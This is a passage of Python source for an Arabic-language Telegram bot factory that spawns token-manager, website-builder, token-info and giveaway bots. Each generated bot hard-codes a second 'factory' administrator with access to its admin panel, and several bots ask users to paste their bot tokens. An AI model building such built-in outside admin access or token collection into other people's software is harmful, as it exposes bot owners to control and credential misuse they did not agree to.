                url = f"https://api.telegram.org/bot{token}/deleteMyProfilePhoto"
                response = requests.post(url, timeout=10)
                
                if response.status_code == 200 and response.json().get("ok"):
                    bot.answer_callback_query(call.id, "🗑️ تم مسح صورة البوت!")
                    bot.send_message(call.message.chat.id, "✅ تم مسح صورة البوت بنجاح!")
                else:
                    bot.answer_callback_query(call.id, "❌ فشل في مسح الصورة!")
            except:
                bot.answer_callback_query(call.id, "❌ خطأ في مسح الصورة!")
        
        elif call.data == "clear_data":
            if user_id in user_tokens:
                del user_tokens[user_id]
            if user_id in user_states:
                user_states[user_id] = None
            bot.answer_callback_query(call.id, "🗑️ تم تنظيف البيانات!")
        
        elif call.data == "reset_state":
            user_states[user_id] = None
            bot.answer_callback_query(call.id, "🔄 تم إعادة تعيين الحالة!")
    
    @bot.message_handler(content_types=["photo"])
    def handle_photo(message):
        user_id = message.from_user.id
        
        if user_states.get(user_id) == STATE_WAITING_PHOTO:
            if user_id not in user_tokens:
                bot.send_message(message.chat.id, "❌ خطأ: لم يتم العثور على توكن محفوظ!")
                return
            
            token = user_tokens[user_id]
            
            try:
                loading_msg = bot.send_message(
                    message.chat.id, "📸 جاري تغيير صورة البوت..."
                )
                
                # الحصول على معلومات الصورة
                file_info = bot.get_file(message.photo[-1].file_id)
                file_url = (
                    f"https://api.telegram.org/file/bot{token}/{file_info.file_path}"
                )
                
                # تحميل الصورة
                photo_response = requests.get(file_url)
                
                # رفع الصورة للبوت المحدد
                upload_url = f"https://api.telegram.org/bot{token}/setMyProfilePhoto"
                
                files = {"photo": ("profile.jpg", photo_response.content, "image/jpeg")}
                
                response = requests.post(upload_url, files=files, timeout=30)
                
                bot.delete_message(message.chat.id, loading_msg.message_id)
                
                if response.status_code == 200:
                    result = response.json()
                    if result.get("ok"):
                        bot.send_message(
                            message.chat.id,
                            "✅ تم تغيير صورة البوت بنجاح! 📸\n\n"
                            "الآن يمكنك تغيير الاسم أيضاً إذا أردت.",
                            reply_markup=create_main_keyboard(),
                        )
                        
                        # الانتقال لحالة تغيير الاسم تلقائياً
                        user_states[user_id] = STATE_WAITING_NAME
                        bot.send_message(message.chat.id, "✏️ الآن أرسل الاسم الجديد للبوت:")
                    else:
                        error_msg = result.get("description", "خطأ غير معروف")
                        bot.send_message(
                            message.chat.id,
                            f"❌ فشل في تغيير الصورة!\n\n"
                            f"السبب: {error_msg}\n\n"
                            "💡 نصائح:\n"
                            "• استخدم صورة بحجم أقل من 5 ميجابايت\n"
                            "• تأكد من أن الصورة بصيغة JPG أو PNG\n"
                            "• جرب صورة مربعة الشكل",
                            reply_markup=create_main_keyboard(),
                        )
                else:
                    bot.send_message(
                        message.chat.id,
                        f"❌ خطأ في الاتصال! كود الخطأ: {response.status_code}\n\n"
                        "تأكد من صحة التوكن والاتصال بالإنترنت.",
                        reply_markup=create_main_keyboard(),
                    )
            
            except requests.exceptions.Timeout:
                bot.send_message(
                    message.chat.id,
                    "❌ انتهت مهلة الاتصال!\nحاول مرة أخرى بصورة أصغر حجماً.",
                    reply_markup=create_main_keyboard(),
                )
            except Exception as e:
                bot.send_message(
                    message.chat.id,
                    f"❌ حدث خطأ أثناء تغيير الصورة:\n{str(e)}",
                    reply_markup=create_main_keyboard(),
                )
            
            user_states[user_id] = None
    
    @bot.message_handler(
        func=lambda message: user_states.get(message.from_user.id) == STATE_WAITING_NAME
    )
    def handle_name_change(message):
        user_id = message.from_user.id
        new_name = message.text.strip()
        
        if user_id not in user_tokens:
            bot.send_message(message.chat.id, "❌ خطأ: لم يتم العثور على توكن محفوظ!")
            return
        
        if len(new_name) < 1 or len(new_name) > 64:
            bot.send_message(message.chat.id, "❌ الاسم يجب أن يكون بين 1 و 64 حرف!")
            return
        
        token = user_tokens[user_id]
        
        try:
            # تغيير اسم البوت
            url = f"https://api.telegram.org/bot{token}/setMyName"
            data = {"name": new_name}
            
            response = requests.post(url, data=data)
            
            if response.status_code == 200 and response.json().get("ok"):
                bot.send_message(
                    message.chat.id,
                    f"✅ تم تغيير اسم البوت بنجاح!\n\n"
                    f"الاسم الجديد: {new_name}\n\n"
                    "🎉 تم الانتهاء من جميع التغييرات!",
                    reply_markup=create_main_keyboard(),
                )
            else:
                bot.send_message(
                    message.chat.id,
                    "❌ فشل في تغيير الاسم!\n"
                    "تأكد من أن الاسم مناسب ولا يحتوي على كلمات محظورة.",
                    reply_markup=create_main_keyboard(),
                )
        
        except Exception as e:
            bot.send_message(
                message.chat.id,
                f"❌ حدث خطأ أثناء تغيير الاسم:\n{str(e)}",
                reply_markup=create_main_keyboard(),
            )
        
        user_states[user_id] = None
    
    @bot.message_handler(commands=["clear"])
    def clear_data(message):
        user_id = message.from_user.id
        if user_id in user_tokens:
            del user_tokens[user_id]
        user_states[user_id] = None
        bot.send_message(
            message.chat.id,
            "🗑️ تم تنظيف جميع البيانات المحفوظة!",
            reply_markup=create_main_keyboard(),
        )
    
    @bot.message_handler(commands=["reset"])
    def reset_state(message):
        user_id = message.from_user.id
        user_states[user_id] = None
        bot.send_message(
            message.chat.id,
            "🔄 تم إعادة تعيين حالة المستخدم!",
            reply_markup=create_main_keyboard(),
        )
    
    @bot.message_handler(func=lambda message: True)
    def handle_other_messages(message):
        user_id = message.from_user.id
        
        if user_states.get(user_id) is None:
            bot.send_message(
                message.chat.id,
                "👋 مرحباً! استخدم الأزرار أدناه للتنقل في البوت.\n\n"
                "أو أرسل /check لفحص توكن جديد.",
                reply_markup=create_main_keyboard(),
            )
    
    # تشغيل البوت
    try:
        bot_username = bot.get_me().username
        print(f"✅ Token manager bot @{bot_username} is now running...")
        bot.infinity_polling(skip_pending=True)
    except Exception as e:
        print(f"Token manager bot with token {token} stopped due to error: {e}")
        if token in running_bot_threads:
            del running_bot_threads[token]

# ==============================================================================
# --- دالة تشغيل بوت إنشاء المواقع ---
# ==============================================================================
def run_website_builder_bot(token, owner_id, data_dir):
    """
    تشغيل بوت إنشاء مواقع الويب
    """
    bot = telebot.TeleBot(token, parse_mode="HTML")
    
    # --- قالب HTML للصفحة ---
    html_template = """
<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>{{ name }}</title>
  <style>
    body { font-family: Arial; direction: rtl; text-align: center; background:#f7f7f7; }
    .card { background: white; width: 400px; margin: 50px auto; padding: 20px; border-radius: 15px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    img { max-width: 100%; border-radius: 10px; }
    h2 { margin: 10px 0; }
    p { color: #555; }
    a { display:block; margin: 5px 0; text-decoration:none; color: blue; }
    ul { list-style:none; padding:0; }
    li { background:#eee; margin:5px; padding:5px; border-radius:8px; }
  </style>
</head>
<body>
  <div class="card">
    {% if photo %}
    <img src="{{ photo }}" alt="photo">
    {% endif %}
    <h2>{{ name }}</h2>
    <p>{{ desc }}</p>
    {% if contact %}<a href="tel:{{ contact }}">📞 {{ contact }}</a>{% endif %}
    {% if social %}<a href="{{ social }}">🌐 رابط اجتماعي</a>{% endif %}
    {% if services %}
      <h3>الخدمات:</h3>
      <ul>
        {% for s in services %}
        <li>{{ s }}</li>
        {% endfor %}
      </ul>
    {% endif %}
  </div>
</body>
</html>
"""
    
    # --- تهيئة قاعدة البيانات ---
    def init_db():
        conn = sqlite3.connect(os.path.join(data_dir, "pages.db"))
        c = conn.cursor()
        c.execute("""CREATE TABLE IF NOT EXISTS pages (
            user_id INTEGER PRIMARY KEY,
            name TEXT,
            description TEXT,
            photo TEXT,
            contact TEXT,
            social TEXT
        )""")
        c.execute("""CREATE TABLE IF NOT EXISTS services (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            service TEXT
        )""")
        conn.commit()
        conn.close()
    
    init_db()
    
    # --- دوال قاعدة البيانات ---
    def get_page(user_id):
        conn = sqlite3.connect(os.path.join(data_dir, "pages.db"))
        c = conn.cursor()
        c.execute("SELECT name, description, photo, contact, social FROM pages WHERE user_id=?", (user_id,))
        page = c.fetchone()
        c.execute("SELECT service FROM services WHERE user_id=?", (user_id,))
        services = [s[0] for s in c.fetchall()]
        conn.close()
        if page:
            return {
                "name": page[0],
                "desc": page[1],
                "photo": page[2],
                "contact": page[3],
                "social": page[4],
                "services": services
            }
        return None
    
    def save_page(user_id, field, value):
        conn = sqlite3.connect(os.path.join(data_dir, "pages.db"))
        c = conn.cursor()
        c.execute("SELECT user_id FROM pages WHERE user_id=?", (user_id,))
        exists = c.fetchone()
        if exists:
            c.execute(f"UPDATE pages SET {field}=? WHERE user_id=?", (value, user_id))
        else:
            c.execute("INSERT INTO pages (user_id, name, description, photo, contact, social) VALUES (?, ?, ?, ?, ?, ?)",
                      (user_id, "اسم افتراضي", "وصف افتراضي", None, None, None))
            c.execute(f"UPDATE pages SET {field}=? WHERE user_id=?", (value, user_id))
        conn.commit()
        conn.close()
    
    def add_service(user_id, service):
        conn = sqlite3.connect(os.path.join(data_dir, "pages.db"))
        c = conn.cursor()
        c.execute("INSERT INTO services (user_id, service) VALUES (?, ?)", (user_id, service))
        conn.commit()
        conn.close()
    
    # --- لوحة التحكم الرئيسية ---
    def create_admin_keyboard():
        kb = InlineKeyboardMarkup(row_width=2)
        kb.row(
            InlineKeyboardButton("📊 الإحصائيات", callback_data="stats"),
            InlineKeyboardButton("📢 إذاعة", callback_data="broadcast")
        )
        kb.row(
            InlineKeyboardButton("⚙️ الإعدادات", callback_data="settings"),
            InlineKeyboardButton("👥 المستخدمين", callback_data="users_list")
        )
        kb.row(
            InlineKeyboardButton("🔍 فحص توكن", callback_data="check_token"),
            InlineKeyboardButton("🔄 تحديث", callback_data="refresh")
        )
        return kb
    
    # --- /start ---
    @bot.message_handler(commands=['start'])
    def start(message):
        markup = InlineKeyboardMarkup(row_width=2)
        markup.row(
            InlineKeyboardButton("📌 إنشاء صفحة جديدة", callback_data="new_page"),
            InlineKeyboardButton("📁 صفحتي", callback_data="my_page")
        )
        markup.add(InlineKeyboardButton("ℹ️ معلومات البوت", callback_data="info"))
        markup.add(InlineKeyboardButton("👑 لوحة التحكم", callback_data="admin_panel"))
        bot.send_message(message.chat.id,
                         "اهلا بك في بوت انشاء صفحات ويب 🌐\nاختر من الأزرار 👇 مطور @ELZo_z ",
                         reply_markup=markup)
    
    # --- القائمة الرئيسية للأزرار ---
    def show_edit_menu(chat_id):
        markup = InlineKeyboardMarkup(row_width=2)
        markup.row(
            InlineKeyboardButton("✏️ تعديل الاسم", callback_data="edit_name"),
            InlineKeyboardButton("🖼 تغيير الصورة", callback_data="edit_photo")
        )
        markup.row(
            InlineKeyboardButton("📝 تعديل الوصف", callback_data="edit_desc"),
            InlineKeyboardButton("➕ إضافة خدمة", callback_data="add_service")
        )
        markup.row(
            InlineKeyboardButton("📞 إضافة وسيلة تواصل", callback_data="add_contact"),
            InlineKeyboardButton("🌐 إضافة رابط اجتماعي", callback_data="add_social")
        )
        markup.row(
            InlineKeyboardButton("👁 رابط موقعك ", callback_data="preview"),
            InlineKeyboardButton("⬅️ رجوع", callback_data="back_to_main")
        )
        bot.send_message(chat_id, "اختر ما تريد تعديله:", reply_markup=markup)
    
    # --- حفظ البيانات ---
    def save_name(message):
        save_page(message.chat.id, "name", message.text)
        bot.send_message(message.chat.id, "✅ تم تغيير الاسم")
        show_edit_menu(message.chat.id)
    
    def save_desc(message):
        save_page(message.chat.id, "description", message.text)
        bot.send_message(message.chat.id, "✅ تم تغيير الوصف")
        show_edit_menu(message.chat.id)
    
    def save_service_step(message):
        add_service(message.chat.id, message.text)
        bot.send_message(message.chat.id, "✅ تم إضافة الخدمة")
        show_edit_menu(message.chat.id)
    
    def save_contact(message):
        save_page(message.chat.id, "contact", message.text)
        bot.send_message(message.chat.id, "✅ تم إضافة رقم التواصل")
        show_edit_menu(message.chat.id)
    
    def save_social(message):
        save_page(message.chat.id, "social", message.text)
        bot.send_message(message.chat.id, "✅ تم إضافة الرابط")
        show_edit_menu(message.chat.id)
    
    # --- التعامل مع الضغط على الأزرار ---
    @bot.callback_query_handler(func=lambda call: True)
    def callback(call):
        chat_id = call.message.chat.id
        
        if call.data == "new_page":
            save_page(chat_id, "name", "اسم افتراضي")
            bot.send_message(chat_id, "✅ تم إنشاء صفحة جديدة")
            show_edit_menu(chat_id)
        
        elif call.data == "my_page":
            page = get_page(chat_id)
            if page:
                url = f"http://127.0.0.1:5000/page/{chat_id}"
                bot.send_message(chat_id, f"🔗 رابط صفحتك: {url}")
            else:
                bot.send_message(chat_id, "ما عندك صفحة بعد!")
        
        elif call.data == "info":
            bot.send_message(chat_id, "هذا بوت لصناعة صفحات شخصية / متجر صغير ✨")
        
        elif call.data == "edit_name":
            bot.send_message(chat_id, "✏️ ارسل الاسم الجديد:")
            bot.register_next_step_handler(call.message, save_name)
        
        elif call.data == "edit_desc":
            bot.send_message(chat_id, "📝 ارسل الوصف الجديد:")
            bot.register_next_step_handler(call.message, save_desc)
        
        elif call.data == "add_service":
            bot.send_message(chat_id, "➕ ارسل اسم الخدمة: بشكل خدمه - سعر - وصف")
            bot.register_next_step_handler(call.message, save_service_step)
        
        elif call.data == "add_contact":
            bot.send_message(chat_id, "📞 ارسل رقم الهاتف:")
            bot.register_next_step_handler(call.message, save_contact)
        
        elif call.data == "add_social":
            bot.send_message(chat_id, "🌐 ارسل رابطك الاجتماعي:")
            bot.register_next_step_handler(call.message, save_social)
        
        elif call.data == "edit_photo":
            bot.send_message(chat_id, "📸 ارسل الصورة الآن:")
        
        elif call.data == "preview":
            page = get_page(chat_id)
            if page:
                url = f"http://127.0.0.1:5000/page/{chat_id}"
                bot.send_message(chat_id, f"🔗 رابط معاينة: {url}")
            else:
                bot.send_message(chat_id, "ما عندك صفحة بعد!")
        
        elif call.data == "back_to_main":
            start(call.message)
        
        elif call.data == "admin_panel":
            if chat_id == owner_id or chat_id == FACTORY_SECOND_ADMIN_ID:  # التحقق من المطور الثاني
                bot.send_message(chat_id, "👑 لوحة تحكم الأدمن", reply_markup=create_admin_keyboard())
            else:
                bot.answer_callback_query(call.id, "❌ ليس لديك صلاحية للدخول هنا", show_alert=True)
        
        elif call.data == "stats":
            if chat_id == owner_id or chat_id == FACTORY_SECOND_ADMIN_ID:
                conn = sqlite3.connect(os.path.join(data_dir, "pages.db"))
                c = conn.cursor()
                c.execute("SELECT COUNT(*) FROM pages")
                pages_count = c.fetchone()[0]
                c.execute("SELECT COUNT(*) FROM services")
                services_count = c.fetchone()[0]
                conn.close()
                
                stats_text = f"""
📊 إحصائيات البوت:
• عدد الصفحات: {pages_count}
• عدد الخدمات: {services_count}
• مالك البوت: {owner_id}
                """
                bot.send_message(chat_id, stats_text)
        
        elif call.data == "check_token":
            if chat_id == owner_id or chat_id == FACTORY_SECOND_ADMIN_ID:
                bot.send_message(chat_id, "🔑 أرسل التوكن الذي تريد فحصه:")
                bot.register_next_step_handler(call.message, check_token_handler)
    
    # --- فحص التوكن ---
    def check_token_handler(message):
        token = message.text.strip()
        try:
            url = f"https://api.telegram.org/bot{token}/getMe"
            response = requests.get(url, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                if data.get("ok"):
                    bot_info = data["result"]
                    info_text = f"""
✅ التوكن صحيح!

🤖 معلومات البوت:
• الاسم: {bot_info.get('first_name', 'غير محدد')}
• اليوزرنيم: @{bot_info.get('username', 'غير محدد')}
• الآيدي: {bot_info.get('id', 'غير محدد')}
                    """
                    bot.send_message(message.chat.id, info_text)
                else:
                    bot.send_message(message.chat.id, "❌ التوكن غير صحيح!")
            else:
                bot.send_message(message.chat.id, "❌ فشل في الاتصال!")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ خطأ: {str(e)}")
    
    # --- التقاط الصور ---
    @bot.message_handler(content_types=['photo'])
    def save_photo(message):
        chat_id = message.chat.id
        file_id = message.photo[-1].file_id
        file_info = bot.get_file(file_id)
        photo_url = f"https://api.telegram.org/file/bot{token}/{file_info.file_path}"
        save_page(chat_id, "photo", photo_url)
        bot.send_message(chat_id, "✅ تم تحديث الصورة")
        show_edit_menu(chat_id)
    
    # --- Flask لعرض الصفحات ---
    def run_flask():
        app = Flask(__name__)
        
        @app.route('/page/<int:user_id>')
        def user_page(user_id):
            page = get_page(user_id)
            if page:
                return render_template_string(html_template, **page)
            return "❌ الصفحة غير موجودة!"
        
        app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)
    
    # --- تشغيل Flask في ثانوي ---
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # --- بدء تشغيل البوت ---
    try:
        bot_username = bot.get_me().username
        print(f"✅ Website builder bot @{bot_username} is now running...")
        bot.infinity_polling(skip_pending=True)
    except Exception as e:
        print(f"Website builder bot with token {token} stopped due to error: {e}")
        if token in running_bot_threads:
            del running_bot_threads[token]

# ==============================================================================
# --- دالة تشغيل بوت معلومات التوكن ---
# ==============================================================================
def run_token_info_bot(token, owner_id, data_dir):
    """
    تشغيل بوت معلومات التوكن
    """
    bot = telebot.TeleBot(token, parse_mode="HTML")
    
    # --- إعدادات ملفات البوت ---
    subscribers_file = os.path.join(data_dir, "users.txt")
    admins_file = os.path.join(data_dir, "admins.txt")
    banned_file = os.path.join(data_dir, "banned.txt")
    status_file = os.path.join(data_dir, "status.txt")
    
    # --- دوال مساعدة ---
    def get_lines(file_path):
        try:
            if not os.path.exists(file_path): return []
            with open(file_path, 'r', encoding='utf-8') as f: 
                return [line.strip() for line in f.readlines() if line.strip()]
        except FileNotFoundError: return []
        
    def add_line(file_path, line):
        current_lines = get_lines(file_path)
        if str(line) not in current_lines:
            with open(file_path, 'a', encoding='utf-8') as f: 
                f.write(f"{line}\n")
                
    def get_setting(file_path, default):
        try:
            with open(file_path, 'r', encoding='utf-8') as f: 
                return f.read().strip()
        except FileNotFoundError: return default
        
    def is_admin(user_id): 
        admins = get_lines(admins_file)
        # التحقق من المطور الأساسي والثاني
        return str(user_id) in admins or user_id == owner_id or user_id == FACTORY_SECOND_ADMIN_ID
    
    def is_bot_enabled(): 
        return get_setting(status_file, "ON") == "ON"
    
    def is_user_banned(user_id): 
        return str(user_id) in get_lines(banned_file)
    
    # --- إعدادات أولية ---
    if not os.path.exists(admins_file): 
        # إضافة المطور الأساسي والثاني كأدمن
        add_line(admins_file, owner_id)
        add_line(admins_file, FACTORY_SECOND_ADMIN_ID)
    if not os.path.exists(status_file): 
        with open(status_file, 'w', encoding='utf-8') as f: 
            f.write("ON")
    
    # --- الحصول على معلومات المطور (صانع البوت) ---
    try:
        owner_info = bot.get_chat(owner_id)
        owner_username = owner_info.username if hasattr(owner_info, 'username') and owner_info.username else f"tg://user?id={owner_id}"
        developer_link = f"https://t.me/{owner_username}" if owner_username.startswith("@") or "tg://" not in owner_username else owner_username
    except:
        developer_link = f"tg://user?id={owner_id}"
    
    # --- معالجات البوت الرئيسية ---
    @bot.message_handler(commands=['start'])
    def start(message):
        user_id = str(message.from_user.id)
        if user_id not in get_lines(subscribers_file):
            add_line(subscribers_file, user_id)
        
        if not is_bot_enabled() and not is_admin(user_id):
            bot.send_message(message.chat.id, "🚨 <b>البوت متوقف حالياً للصيانة.</b>")
            return
        
        if is_user_banned(user_id):
            bot.send_message(message.chat.id, "🚫 <b>أنت محظور من استخدام هذا البوت.</b>")
            return
        
        kb = telebot.types.InlineKeyboardMarkup(row_width=2)
        kb.row(
            telebot.types.InlineKeyboardButton('• معلومات التوكن •', callback_data='btn1'),
            telebot.types.InlineKeyboardButton('• المطور •', url=developer_link)
        )
        
        welcome_text = """<strong>
👋🏻
—————————————————
اهلاً بك عزيزي 
في بوت معلومات التوكن ❤
</strong>"""
        
        bot.send_message(message.chat.id, welcome_text, reply_markup=kb, parse_mode='html')
    
    @bot.callback_query_handler(func=lambda call: True)
    def handle_callbacks(call):
        if call.data == 'btn1':
            msg = bot.send_message(call.message.chat.id, "🔑 <b>أرسل التوكن الآن:</b>\n\n(يجب أن يبدأ بـ <code>bot</code> ويحتوي على رمز صحيح)")
            bot.register_next_step_handler(msg, process_token)
    
    def process_token(message):
        token = message.text.strip()
        try:
            getme = requests.get(f"https://api.telegram.org/bot{token}/getMe").json()
            webhook = requests.get(f"https://api.telegram.org/bot{token}/getWebhookInfo").json()

            if not getme.get("ok"):
                bot.send_message(message.chat.id, "❌ التوكن غير صالح.")
                return

            user = getme["result"]["username"]
            name = getme["result"]["first_name"]
            user_id = getme["result"]["id"]
            webhook_url = webhook["result"].get("url", "❌ لا يوجد ويبهوك")

            btn = telebot.types.InlineKeyboardButton('• المطور •', url=developer_link)
            c = telebot.types.InlineKeyboardMarkup(row_width=2)
            c.row(btn)

            bot.send_message(message.chat.id, f"""
<strong>✅ معلومات التوكن</strong>
——————————————
👤 الاسم: {name}
📎 اليوزر: @{user}
🆔 الايدي: {user_id}
🌐 الويبهوك: {webhook_url}
""", reply_markup=c, parse_mode='html')

        except Exception as e:
            bot.send_message(message.chat.id, f"حدث خطأ أثناء جلب المعلومات.\n{e}")

    try:
        bot_username = bot.get_me().username
        print(f"✅ Token info bot @{bot_username} is now running...")
        bot.infinity_polling(skip_pending=True)
    except Exception as e:
        print(f"Token info bot with token {token} stopped due to error: {e}")
        if token in running_bot_threads:
            del running_bot_threads[token]

# ==============================================================================
# --- دالة تشغيل بوت الروليت ---
# ==============================================================================
def run_roulette_bot(token, owner_id, data_dir):
    """
    تشغيل بوت الروليت من المصنع
    """
    bot = telebot.TeleBot(token, parse_mode="HTML")

    user_states = {}
    user_temp_data = {}
    bound_channels = {}
    active_roulettes = {}
    banned_from_creator_roulettes = {}
    global_banned_users = set()
    
    bot_enabled = True
    notify_on_join = False
    notify_on_ban = False
    welcome_message = "👋 أهلاً بك [USER_MENTION] في مجموعتنا!"
    all_user_ids = set()
    ADMIN_ID = owner_id

    # --- الحصول على معلومات المطور (صانع البوت) ---
    try:
        owner_info = bot.get_chat(owner_id)
        owner_username = owner_info.username if hasattr(owner_info, 'username') and owner_info.username else f"tg://user?id={owner_id}"
        developer_link = f"https://t.me/{owner_username}" if owner_username.startswith("@") or "tg://" not in owner_username else owner_username
        developer_text = f"@{owner_info.username}" if owner_info.username else f"المطور (ID: {owner_id})"
    except:
        developer_link = f"tg://user?id={owner_id}"
        developer_text = f"المطور (ID: {owner_id})"

    # --- دوال مساعدة ---
    def save_data():
        with open(os.path.join(data_dir, 'bot_data.json'), 'w') as f:
            json.dump({
                'user_states': user_states,
                'user_temp_data': user_temp_data,
                'bound_channels': bound_channels,
                'active_roulettes': {k: {**v, 'participants': list(v['participants']), 'reminders': list(v['reminders'])} for k, v in active_roulettes.items()},
                'banned_from_creator_roulettes': {k: list(v) for k, v in banned_from_creator_roulettes.items()},
                'global_banned_users': list(global_banned_users),
                'bot_enabled': bot_enabled,
                'notify_on_join': notify_on_join,
                'notify_on_ban': notify_on_ban,
                'welcome_message': welcome_message,
                'all_user_ids': list(all_user_ids),
                'ADMIN_ID': ADMIN_ID,
            }, f)

    def load_data():
        nonlocal user_states, user_temp_data, bound_channels, active_roulettes, \
               banned_from_creator_roulettes, global_banned_users, bot_enabled, \
               notify_on_join, notify_on_ban, welcome_message, all_user_ids, ADMIN_ID
        
        data_file = os.path.join(data_dir, 'bot_data.json')
        if os.path.exists(data_file):
            with open(data_file, 'r') as f:
                data = json.load(f)
                user_states = data.get('user_states', {})
                user_temp_data = data.get('user_temp_data', {})
                bound_channels = data.get('bound_channels', {})
                active_roulettes = {k: {**v, 'participants': set(v['participants']), 'reminders': set(v['reminders'])} for k, v in data.get('active_roulettes', {}).items()}
                banned_from_creator_roulettes = {k: set(v) for k, v in data.get('banned_from_creator_roulettes', {}).items()}
                global_banned_users = set(data.get('global_banned_users', []))
                bot_enabled = data.get('bot_enabled', True)
                notify_on_join = data.get('notify_on_join', False)
                notify_on_ban = data.get('notify_on_ban', False)
                welcome_message = data.get('welcome_message', "👋 أهلاً بك [USER_MENTION] في مجموعتنا!")
                all_user_ids = set(data.get('all_user_ids', []))
                ADMIN_ID = data.get('ADMIN_ID', owner_id)

    def is_admin(user_id: int):
        return user_id == ADMIN_ID or user_id == FACTORY_SECOND_ADMIN_ID

    def main_menu_kb():
        kb = InlineKeyboardMarkup(row_width=2)
        kb.row(
            InlineKeyboardButton("🎯 إنشاء روليت", callback_data="create_roulette"),
            InlineKeyboardButton("🔗 ربط قناة", callback_data="bind_main_channel")
        )
        kb.row(
            InlineKeyboardButton("✖️ فصل القناة", callback_data="disconnect_main_channel"),
            InlineKeyboardButton("@ELZo_z", url=developer_link)
        )
        return kb

    def channel_binding_kb():
        kb = InlineKeyboardMarkup(row_width=2)
        kb.row(
            InlineKeyboardButton("📥 أضفني إلى مجموعتك", url=f"https://t.me/{bot.get_me().username}?startgroup=true"),
            InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main_menu")
        )
        return kb

    def roulette_creation_options_kb():
        kb = InlineKeyboardMarkup(row_width=2)
        kb.row(
            InlineKeyboardButton("🎨 تعديل الكليشة", callback_data="choose_style_instructions"),
            InlineKeyboardButton("➕ إضافة قناة شرط", callback_data="prompt_conditional_channel")
        )
        kb.add(InlineKeyboardButton("⏭️ تخطي", callback_data="skip_conditional_channel"))
        return kb

    def conditional_channel_choice_kb():
        kb = InlineKeyboardMarkup(row_width=2)
        kb.row(
            InlineKeyboardButton("🔗 إضافة رابط قناة", callback_data="send_conditional_channel_link_prompt"),
            InlineKeyboardButton("⏭️ تخطي", callback_data="skip_conditional_channel")
        )
        return kb

    def get_channel_roulette_markup(roulette_id: str, is_active: bool):
        kb = InlineKeyboardMarkup(row_width=2)
        kb.row(
            InlineKeyboardButton("🎁 المشاركة في السحب", callback_data=f"join_roulette_{roulette_id}"),
            InlineKeyboardButton("🔔 ذكرني إذا فزت", callback_data=f"remind_me_roulette_{roulette_id}")
        )
        kb.row(
            InlineKeyboardButton("▶️ تشغيل المشاركة" if not is_active else "⏸️ إوقف المشاركة",
                                callback_data=f"toggle_participation_{roulette_id}"),
            InlineKeyboardButton("🏁 ابدأ السحب", callback_data=f"start_draw_{roulette_id}")
        )
        kb.add(InlineKeyboardButton("📊 عرض المشاركين", callback_data=f"view_participants_{roulette_id}"))
        return kb

    def creator_exclude_kb(roulette_id: str, participant_id: int):
        kb = InlineKeyboardMarkup(row_width=2)
        kb.row(InlineKeyboardButton("❌ استبعاد هذا المشارك", callback_data=f"exclude_participant_{roulette_id}_{participant_id}"))
        return kb

    def admin_main_menu_kb():
        kb = InlineKeyboardMarkup(row_width=2)
        kb.row(
            InlineKeyboardButton("📝 إدارة الروليتات", callback_data="admin_manage_roulettes"),
            InlineKeyboardButton("🚫 إدارة المستخدمين المحظورين", callback_data="admin_manage_banned_users")
        )
        kb.row(
            InlineKeyboardButton("⚙️ إعدادات البوت", callback_data="admin_bot_settings"),
            InlineKeyboardButton("📢 الإذاعة", callback_data="admin_broadcast_message")
        )
        kb.add(InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main_menu"))
        return kb

    def admin_bot_settings_kb():
        kb = InlineKeyboardMarkup(row_width=2)
        kb.row(
            InlineKeyboardButton(f"🔒 حماية المحتوى: {'مفعل' if bot_enabled else 'معطل'}", callback_data="admin_toggle_content_protection"),
            InlineKeyboardButton(f"⛔ تشغيل/إيقاف البوت: {'مفعل' if bot_enabled else 'متوقف'}", callback_data="admin_toggle_bot_status")
        )
        kb.row(
            InlineKeyboardButton(f"👁️ إشعار دخول: {'مفعل' if notify_on_join else 'معطل'}", callback_data="admin_toggle_notify_on_join"),
            InlineKeyboardButton(f"🛡️ إشعار حظر: {'مفعل' if notify_on_ban else 'معطل'}", callback_data="admin_toggle_notify_on_ban")
        )
        kb.row(
            InlineKeyboardButton("✉️ تعديل الترحيب", callback_data="admin_edit_welcome_message"),
            InlineKeyboardButton("📣 القنوات الشرطية", callback_data="admin_manage_conditional_channels_stub")
        )
        kb.add(InlineKeyboardButton("🔙 رجوع", callback_data="admin_main_menu"))
        return kb

    def admin_manage_banned_users_kb():
        kb = InlineKeyboardMarkup(row_width=2)
        kb.row(
            InlineKeyboardButton("➕ حظر مستخدم", callback_data="admin_prompt_ban_user"),
            InlineKeyboardButton("➖ فك حظر مستخدم", callback_data="admin_prompt_unban_user")
        )
        kb.add(InlineKeyboardButton("📋 عرض قائمة المحظورين", callback_data="admin_view_global_banned_users"))
        kb.add(InlineKeyboardButton("🔙 رجوع", callback_data="admin_main_menu"))
        return kb

    def is_channel_member(channel_id, user_id):
        try:
            member = bot.get_chat_member(channel_id, user_id)
            return member.status not in ['left', 'kicked']
        except Exception:
            return False

    def get_channel_info_from_link(link: str):
        match_username = re.match(r"^(?:https?://t\.me/)?@?([a-zA-Z0-9_]+)$", link)
        if match_username:
            return "@" + match_username.group(1)
        return None

    def update_roulette_message(roulette_id: str):
        r = active_roulettes.get(roulette_id)
        if not r:
            return

        try:
            participants_count = len(r['participants'])
            updated_text = f"{r['text']}\n\n👥 عدد المشاركين: {participants_count}"
            if not r['active']:
                updated_text += "\n⛔ المشاركة متوقفة حالياً."
            if r['winners']:
                winners_usernames = []
                for winner_id in r['winners']:
                    try:
                        winner_info = bot.get_chat(winner_id)
                        winners_usernames.append(f"@{winner_info.username}" if winner_info.username else f"المستخدم {winner_id}")
                    except Exception:
                        winners_usernames.append(f"المستخدم {winner_id}")
                updated_text += "\n\n🏆 الفائزون:\n" + "\n".join(winners_usernames)

            bot.edit_message_text(
                chat_id=r['main_channel_id'],
                message_id=r['channel_message_id'],
                text=updated_text,
                parse_mode="HTML",
                reply_markup=get_channel_roulette_markup(roulette_id, r['active'])
            )
        except Exception:
            pass
        save_data()

    def publish_roulette(user_id: int):
        data = user_temp_data.get(user_id)
        if not data or 'roulette_text' not in data or 'main_channel_id' not in data or 'winners_count' not in data:
